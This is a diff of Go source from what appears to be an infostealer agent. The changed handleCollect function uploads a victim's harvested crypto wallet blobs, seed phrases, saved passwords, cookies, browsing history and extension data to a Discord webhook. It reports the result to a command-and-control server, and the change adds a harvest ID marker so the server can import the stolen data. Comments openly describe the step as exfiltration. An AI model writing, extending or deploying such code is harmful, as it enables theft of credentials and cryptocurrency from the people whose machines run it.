@@ -229,7 +229,7 @@ func handleCollect(payload []byte) {
 	if useDiscord {
 		// ── Agent → Discord webhook (HTTP). C2 WS only gets a small completion event. ──
 		sendEvent("status", map[string]string{"message": "Uploading harvest to Discord webhook..."})
-		threadID, uerr := uploadHarvestToDiscord(hostInfo.ClientID, result, seeds, walletBlobs, dcfg)
+		threadID, harvestID, uerr := uploadHarvestToDiscord(hostInfo.ClientID, result, seeds, walletBlobs, dcfg)
 		if uerr != nil {
 			log.Printf("[recovery] Discord webhook upload failed: %v", uerr)
 			sendEvent("error", map[string]string{"error": "discord upload: " + uerr.Error()})
@@ -242,17 +242,19 @@ func handleCollect(payload []byte) {
 			return
 		}
 		sendEvent("discord_upload_complete", map[string]interface{}{
-			"clientId":    hostInfo.ClientID,
-			"threadId":    threadID,
-			"wallets":     len(walletBlobs),
-			"seeds":       len(seeds),
-			"passwords":   len(result.Passwords),
-			"cookies":     len(result.Cookies),
-			"history":     len(result.History),
-			"extensions":  len(result.Extensions),
+			"clientId":   hostInfo.ClientID,
+			"threadId":   threadID,
+			"harvestId":  harvestID,
+			"marker":     "STUART_HARVEST_ID:" + harvestID,
+			"wallets":    len(walletBlobs),
+			"seeds":      len(seeds),
+			"passwords":  len(result.Passwords),
+			"cookies":    len(result.Cookies),
+			"history":    len(result.History),
+			"extensions": len(result.Extensions),
 		})
 		sendEvent("status", map[string]string{"message": "Discord upload complete — server will import from forum post"})
-		log.Printf("[recovery] Discord pipeline done thread=%s (no bulk WS exfil)", threadID)
+		log.Printf("[recovery] Discord pipeline done thread=%s harvest=%s (single post, no bulk WS)", threadID, harvestID)
 		return
 	}
 
